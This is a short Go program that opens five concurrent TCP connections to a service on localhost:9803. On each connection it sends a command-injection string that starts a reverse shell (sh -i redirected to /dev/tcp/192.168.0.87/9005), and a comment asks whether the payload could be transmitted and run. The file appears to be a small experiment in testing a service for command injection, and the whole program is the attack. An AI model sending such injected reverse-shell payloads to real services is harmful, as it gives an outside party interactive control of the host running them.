package main

import (
	"fmt"
	"net"
	"sync"
)

var wait sync.WaitGroup

//10.76.165.15

func runConnection() {
	conn, err := net.Dial("tcp", "localhost:9803")
	fmt.Println("this is a test")
	if err != nil {
		fmt.Println(err)
		return
	}

	_, err = conn.Write([]byte("; sh -i >& /dev/tcp/192.168.0.87/9005 0>&1")) //Could this be transmitted and ran?

	if err != nil {
		fmt.Println("BROKE")
		return
	}
	defer wait.Done()

}

func main() {
	// Connect to the server
	for i := 0; i < 5; i++ {
		wait.Add(1)
		go runConnection()
	}
	wait.Wait()
}
